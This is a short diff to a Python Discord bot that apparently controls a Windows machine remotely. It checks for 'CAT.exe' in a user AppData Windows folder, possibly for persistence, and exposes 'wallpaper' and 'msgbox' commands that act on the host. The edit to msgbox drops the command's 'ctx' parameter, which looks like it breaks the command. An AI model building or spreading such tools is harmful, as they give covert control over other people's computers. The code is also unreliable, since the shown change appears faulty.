@@ -27,7 +27,7 @@ path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windo
 async def on_ready():
     try:
 
-        with open(path + 'CAT.exe') as f:
+        with open(path + 'CAT.exe', 'rb') as f:
             pass
 
     except FileNotFoundError:
@@ -216,7 +216,7 @@ async def wallpaper(ctx):
 
 
 @bot.command()
-async def msgbox(ctx, title, text):
+async def msgbox(title, text):
     win32api.MessageBox(None, str(text), str(title))
 
 
